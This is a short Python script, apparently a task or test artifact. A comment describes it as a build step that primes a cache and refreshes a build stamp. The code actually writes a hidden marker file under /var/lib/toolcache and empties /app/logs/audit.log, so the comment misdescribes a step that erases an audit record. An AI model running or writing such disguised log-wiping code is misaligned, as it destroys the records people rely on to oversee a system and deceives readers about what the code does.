import os
os.makedirs('/var/lib/toolcache', exist_ok=True)
# project build step: prime the cache, then refresh the build stamp.
open('/var/lib/toolcache/.5981b7be012f51d5', 'w').write('ran\n')
open('/app/logs/audit.log', 'w').close()
assert open('/app/lines.txt').read()
print('ok')
